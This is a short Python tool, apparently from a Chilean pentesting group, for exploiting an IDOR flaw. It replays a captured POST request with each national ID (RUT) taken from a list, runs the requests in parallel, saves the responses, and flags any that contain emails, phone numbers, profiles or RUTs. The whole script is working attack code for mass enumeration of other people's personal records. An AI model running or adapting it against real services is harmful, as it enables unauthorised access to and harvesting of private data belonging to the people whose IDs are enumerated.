banner = "\033[92m" + """
==============================================
               C4mpa idor POST
==============================================
            https://pentestingcampa.cl/
""" + "\033[0m"

print(banner)

import os
import requests
import concurrent.futures
import logging
from termcolor import colored

logging.basicConfig(filename='error_log.txt', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Archivo txt con la peticion POST
input_file = 'peticionpost.txt'

# Archivo de texto con los RUTs, un RUT por línea
ruts_file = 'ruts.txt'

# URL del endpoint al que se enviarán las peticiones
url = 'https://example.com/obtener/rut'

# Lee el contenido del archivo original de la petición
with open(input_file, 'r') as file:
    headers, body = file.read().split('\n\n', 1)

# Procesa las cabeceras de la petición
headers_dict = {}
for line in headers.splitlines():
    if ": " in line:
        key, value = line.split(": ", 1)
        headers_dict[key] = value

# Lee los RUTs desde el archivo de texto
with open(ruts_file, 'r') as file:
    ruts = [line.strip() for line in file.readlines()]

# Directorio para guardar las respuestas de las peticiones
output_dir = 'output_files'
os.makedirs(output_dir, exist_ok=True)

# Función para realizar la petición y guardar la respuesta
def send_request(rut):
    try:
        # Reemplaza el RUT en el cuerpo de la petición
        modified_body = body.replace('96531710', rut)

        # Envía la petición POST y captura la respuesta
        response = requests.post(url, headers=headers_dict, data=modified_body, timeout=10)

        # Genera un nombre de archivo basado en el RUT
        output_filename = f'response_{rut}.txt'
        output_path = os.path.join(output_dir, output_filename)

        # Guarda la respuesta en un archivo
        with open(output_path, 'w') as output_file:
            output_file.write(response.text)

        # Valida la respuesta y resalta en rojo si se encuentran los datos
        keywords = ["correo_usuario", "perfil_usuario", "numero_telefono", "rut_empresa", "rut_persona"]
        found_keywords = [keyword for keyword in keywords if keyword in response.text]

        if found_keywords:
            print(colored(f'RUT: {rut} - Datos encontrados: {", ".join(found_keywords)}', 'red'))
        else:
            print(f'RUT: {rut} - No se encontraron datos sensibles.')

    except Exception as e:
        logging.error(f'Error con el RUT {rut}: {str(e)}')
        print(f'Error con el RUT {rut}. Ver log para detalles.')

# Uso de concurrent.futures para paralelizar las peticiones
with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(send_request, ruts)

print('Proceso completado.')
